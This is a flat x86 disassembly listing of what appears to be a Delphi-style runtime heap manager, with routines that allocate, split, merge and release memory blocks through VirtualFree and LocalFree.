sub_401143
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40330c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401165
inc ebp
adc [ eax ] eax
dec edi
adc [ eax ] eax
pop ecx
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc [ gs : eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ edi + edx * 2 + 0x40 ] al
add [ eax + 0x57 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax + 0x57 ] ah
inc eax
add [ edx + esi ] cl
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ ecx + 0x11 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar bh 0x25
jb r-xdata
mov [ ecx - 0x3f74ffb9 ] es
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401370
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401330
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013c8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401370
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401410
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013c8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401480
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013c8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401514
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401578
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401340
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4015f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4013f8
mov [ rw-data ] 0x1
sub_4016a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401340
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40173c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401514
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016a8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401410
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4015f0
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_40184c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016a8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_401970
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40173c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4015f0
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401480
jmp r-xdata
sub_4019fc
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ab2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401350
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
push 0xff8
push 0x0
call sub_401330
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ab9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401360
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ac0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401b96
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401358
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401368
retn
push rw-data
call sub_401360
sub_401ba0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c04
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c34
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e08
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c88
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c64
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cb0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401ba0
add ebx esi
mov [ rw-data ] 0x6
sub_401d20
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401ba0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c04
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401970
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401970
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c34
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401480
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c88
sub_401e08
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d58
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401e90
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c64
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401edc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401e90
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cb0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d20
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c34
sub [ edi + 0x4 ] 0x4
sub_401f68
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017bc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401f94
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40184c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fc8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_401ff4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401ba0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e08
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f68
test al al
jne r-xdata
mov eax esi
call sub_401fc8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_4019fc
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402264
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401358
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_401ff4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401360
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a90
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a90
jmp r-xdata
sub_402278
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40240a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401358
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401360
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403a90
jmp r-xdata
call sub_401e90
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401ba0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e08
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401ba0
